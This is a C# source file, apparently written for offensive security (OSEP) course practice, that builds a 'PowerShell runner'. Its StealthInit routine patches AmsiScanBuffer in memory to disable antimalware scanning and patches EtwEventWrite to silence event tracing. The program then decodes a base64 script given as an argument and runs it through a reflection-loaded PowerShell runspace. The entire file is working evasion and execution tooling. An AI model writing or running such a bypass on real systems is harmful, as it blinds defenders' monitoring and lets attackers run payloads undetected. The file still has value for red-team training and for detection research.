using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Collections;
using System.Linq;

namespace OSEP
{
    class PowerShellRunner
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        static void StealthInit()
        {
            try {
                IntPtr hAmsi = GetModuleHandle("amsi.dll");
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi != IntPtr.Zero) {
                    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                    uint oldProtect;
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                }
            } catch { }

            try {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                byte[] patch = { 0xC2, 0x14, 0x00 }; // ret 14
                uint oldProtect;
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            } catch { }
        }

        // Helper to find methods without ambiguity
        static MethodInfo GetMethodSurgical(Type type, string name, Type[] parameterTypes)
        {
            try {
                return type.GetMethod(name, BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance, null, parameterTypes, null);
            } catch {
                // Manual fallback if GetMethod still fails
                foreach (var m in type.GetMethods()) {
                    if (m.Name == name && !m.IsGenericMethod) {
                        var ps = m.GetParameters();
                        if (ps.Length == parameterTypes.Length) {
                            bool match = true;
                            for (int i = 0; i < ps.Length; i++) {
                                if (ps[i].ParameterType != parameterTypes[i]) { match = false; break; }
                            }
                            if (match) return m;
                        }
                    }
                }
            }
            return null;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0) {
                Console.WriteLine("Usage: Runner.exe <Base64_Encoded_Script>");
                return;
            }

            StealthInit();

            try
            {
                string script = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));

                var automation = Assembly.Load("System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                
                var runspaceFactoryType = automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory");
                var runspaceType = automation.GetType("System.Management.Automation.Runspaces.Runspace");
                var powerShellType = automation.GetType("System.Management.Automation.PowerShell");

                // CreateRunspace()
                var createRS = GetMethodSurgical(runspaceFactoryType, "CreateRunspace", new Type[0]);
                var runspace = createRS.Invoke(null, null);
                
                // runspace.Open()
                var openRS = GetMethodSurgical(runspaceType, "Open", new Type[0]);
                openRS.Invoke(runspace, null);

                // PowerShell.Create()
                var createPS = GetMethodSurgical(powerShellType, "Create", new Type[0]);
                var ps = createPS.Invoke(null, null);

                // ps.Runspace = runspace
                powerShellType.GetProperty("Runspace").SetValue(ps, runspace);
                
                // ps.AddScript(string)
                var addScript = GetMethodSurgical(powerShellType, "AddScript", new Type[] { typeof(string) });
                addScript.Invoke(ps, new object[] { script });

                // ps.Invoke()
                var invokePS = GetMethodSurgical(powerShellType, "Invoke", new Type[0]);
                var results = (IEnumerable)invokePS.Invoke(ps, null);

                foreach (var obj in results) {
                    if (obj != null) Console.WriteLine(obj.ToString());
                }

                // Close
                var closeRS = GetMethodSurgical(runspaceType, "Close", new Type[0]);
                closeRS.Invoke(runspace, null);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error: " + (e.InnerException != null ? e.InnerException.Message : e.Message));
            }
        }
    }
}
